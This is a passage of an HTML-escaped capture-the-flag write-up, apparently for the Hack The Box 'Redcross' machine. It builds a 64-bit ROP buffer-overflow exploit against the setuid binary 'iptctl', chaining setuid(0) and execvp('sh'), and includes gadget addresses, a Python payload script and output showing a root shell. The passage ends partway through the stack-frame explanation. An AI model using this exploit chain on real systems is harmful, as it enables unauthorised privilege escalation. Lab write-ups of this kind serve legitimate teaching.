        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isValidAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isValidIpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: %s allow|restrict|show IP&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inputAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inputAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// [...redacted...]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We will also use GDB peda as our debugger.&lt;/p&gt;

&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Get a copy of binary and put it on your attacker machine&lt;/li&gt;
  &lt;li&gt;Determine protections&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# check ASLR on victim machine&lt;/span&gt;
penelope@redcross:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/sys/kernel/randomize_va_space
2
penelope@redcross:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# check PIE on gdb peda on attacker machine&lt;/span&gt;
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Find offset to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# set breakpoints&lt;/span&gt;
br &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;interactive+73
br &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;interactive+73

&lt;span class=&quot;c&quot;&gt;# create pattern - 50 is more than enough since we only need&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 10 bytes to overflow&lt;/span&gt;
pattern_create 50

&lt;span class=&quot;c&quot;&gt;# run interactively&lt;/span&gt;
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;run &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
Starting program: /home/kali/data/practice/hack_the_box/linux/redcross/iptctl &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
Entering interactive mode
Action&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;allow|restrict|show&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: allowAAA%AAsAABAA&lt;span class=&quot;nv&quot;&gt;$AAnAACAA&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;AADAA&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;AA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;AAEAAaAA0AAFAAbA
&lt;span class=&quot;c&quot;&gt;# [...redacted....]&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# find offset - get value of &quot;saved rip&quot; first&lt;/span&gt;
info frame 
pattern_offset 0x4541412941413b41

&lt;span class=&quot;c&quot;&gt;# offset is 29&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Since we cannot execute code on stack, we need to find a static address of gadgets we can use. These addresses will remain the same inside victim and attacker machine. I believe the reason is because PIE is not enabled on the program. We also wanted to do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid(0)&lt;/code&gt; first before dropping to shell via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execvp&lt;/code&gt; so that can gain the effective UID of root. Our payload structure will look like this. For detailed information about the payload structure, see the section below “Explaining the payload structure”.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;allow&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setuid_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rsi_pop_r15_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execvp_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1.1.1.1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Now let’s find the values&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# pop_rdi_addr&lt;/span&gt;
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropsearch &lt;span class=&quot;s2&quot;&gt;&quot;pop rdi&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# null&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# setuid_addr&lt;/span&gt;
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;plt
&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
Breakpoint 37 at 0x400780 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;setuid@plt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
gdb-peda&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# sh_addr&lt;/span&gt;
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
    iptctl : 0x40046e &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x7063727473006873 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sh'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# pop_rsi_pop_r15_addr&lt;/span&gt;
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropsearch &lt;span class=&quot;s2&quot;&gt;&quot;pop rsi&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
0x00400de1 : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;s1&quot;&gt;'5e415fc3'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	pop rsi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# execvp_addr&lt;/span&gt;
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;plt
Breakpoint 42 at 0x400760 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;execvp@plt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Let’s construct our final python script. I will not use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn&lt;/code&gt; tools to show how this is being done without any helper functions.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# gadgets and variables - take note that due to being little
# endian, we need to consutrct the memory addresses in reverse
# order. For example, if we see an addres in gdb which is
# &quot;0x400760&quot; in python it will be &quot;\x60\x07\x40&quot;.
# 
# Another thing to take note of is that since we are dealing
# with 64-bit architecture, you might often see in debuggers
# that they only display 6 bytes of address instead of 8.
# That's because the remaining 2 bytes are not used. So in our
# python script, just replace the missing 2 bytes with NULL
# bytes &quot;\x00\x00&quot;.                                                           
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe3\x0d\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                                                                                   
&lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6e\04\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                                                                               
&lt;span class=&quot;n&quot;&gt;pop_rsi_pop_r15_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe1\x0d\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                                                                            
&lt;span class=&quot;n&quot;&gt;execvp_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x60\x07\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                                                                                   
&lt;span class=&quot;n&quot;&gt;setuid_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x80\x07\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                
&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
                                                                                
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;allow&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setuid_addr&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rsi_pop_r15_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execvp_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1.1.1.1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Copy this script any run on victim machine&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;penelope@redcross:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python2 bof.py&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; -&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | /opt/iptctl/iptctl &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
Entering interactive mode
&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;penelope&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;egid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,25&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;floppy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,29&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;audio&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,44&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;video&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,108&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;netdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,112&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lpadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,116&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;penelope&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1003&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mailadm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;explaining-the-payload-structure&quot;&gt;Explaining the payload structure&lt;/h2&gt;
&lt;p&gt;First things to understand is how the calling conventions work for 32-bit and 64-bit architectures.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;execvp&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
NULL
NULL
pop rsi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
&lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;
pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
setuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
NULL
pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
&lt;span class=&quot;s2&quot;&gt;&quot;allow&quot;&lt;/span&gt; + &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;29
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To better understand, let’s divide the payload into different stack frames.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# stack frame 2&lt;/span&gt;
execvp&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
NULL
NULL
pop rsi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
&lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;
pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret

&lt;span class=&quot;c&quot;&gt;# stack frame 1&lt;/span&gt;
setuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
NULL
pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
&lt;span class=&quot;s2&quot;&gt;&quot;allow&quot;&lt;/span&gt; + &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;29
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s take a closer look at stack frame 1.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;## higher memory address ##&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Once the &quot;pop rdi&quot; instruction is finished executing, the&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# next instructions is &quot;ret&quot;. Since &quot;setuid()&quot; address is the&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# next value from stack, the flow of execution will now go&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# there completing our command `setuid(0)`.&lt;/span&gt;
setuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# When the &quot;pop rdi&quot; instruction executes, it will pop&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# the next value from the stack into RDI. That next value is&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# NULL which is also equal to &quot;0&quot;.&lt;/span&gt;
NULL

&lt;span class=&quot;c&quot;&gt;# This contains the address of &quot;pop rdi; ret&quot;. Why do need it?&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# In 64-bit calling convention, to pass a parameter to a&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# function, in this case `setuid()`, we need to put the&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# parameter into RDI. Then once its there, the function will&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# get it in the form of `setuid(0)`.&lt;/span&gt;
pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret

&lt;span class=&quot;c&quot;&gt;# This is the overflow part which will allow us to control the&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# next instruction to execute which is on RIP. The next&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# instruction will be on top of this.&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;allow&quot;&lt;/span&gt; + &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;29

&lt;span class=&quot;c&quot;&gt;## lower memory address ##&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then for stack frame 2.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;## higher memory address ##&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# When &quot;ret&quot; executes, it will go to address of instruction&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# `execvp()` completing our final function call which is&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# `execvp(&quot;sh&quot;, NULL)`&lt;/span&gt;
execvp&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# When &quot;pop r15&quot; executes, it will put NULL into RSI&lt;/span&gt;
NULL

&lt;span class=&quot;c&quot;&gt;# When &quot;pop rsi&quot; executes, it will put NULL into RSI&lt;/span&gt;
NULL

&lt;span class=&quot;c&quot;&gt;# When &quot;ret&quot; instruction executes, it will go to this&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# instruction. Why do we need &quot;pop r15&quot;? Actually we don't&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# need it. It just happened that there is no gadget which&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# consists only of &quot;pop rsi&quot;. So for completenes, we have no&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# choice but to include also &quot;pop r15&quot; in our ROP chain.&lt;/span&gt;
